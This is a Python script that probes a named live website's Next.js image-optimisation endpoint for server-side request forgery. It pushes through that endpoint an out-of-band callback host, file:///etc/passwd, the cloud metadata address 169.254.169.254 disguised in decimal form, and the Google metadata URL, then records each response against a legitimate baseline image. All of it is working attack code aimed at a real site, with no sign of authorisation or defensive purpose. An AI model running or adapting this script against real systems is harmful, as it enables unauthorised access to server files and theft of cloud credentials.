import urllib.parse, subprocess, sys

H = "oob7ad8f3c10d11." + "dau2p4ghgqag02k5emggc5xu6hph3m973." + "oast.abhedi.co.in"
targets = [
    "http://" + H + "/ssrf_img",
    "file:///etc/passwd",
    "http://" + str(int("2852039166")) + "/latest/meta-data/",   # 169.254.169.254 as decimal
    "http://metadata.google.internal/computeMetadata/v1/",
]
for u in targets:
    enc = urllib.parse.quote(u, safe="")
    url = "https://www.infinitycapital.bh/_next/image?url=" + enc + "&w=1080&q=75"
    r = subprocess.run(["curl", "-s", "-m", "20", "-o", "/tmp/i", "-w",
                        "CODE=%{http_code} SZ=%{size_download} CT=%{content_type}", url],
                       capture_output=True, text=True)
    print("TGT:", u[:60], "=>", r.stdout)

r = subprocess.run(["curl", "-s", "-m", "20", "-o", "/tmp/img_ok", "-w",
                    "LEGIT CODE=%{http_code} SZ=%{size_download}",
                    "https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080&q=75"],
                   capture_output=True, text=True)
print("BASELINE:", r.stdout)
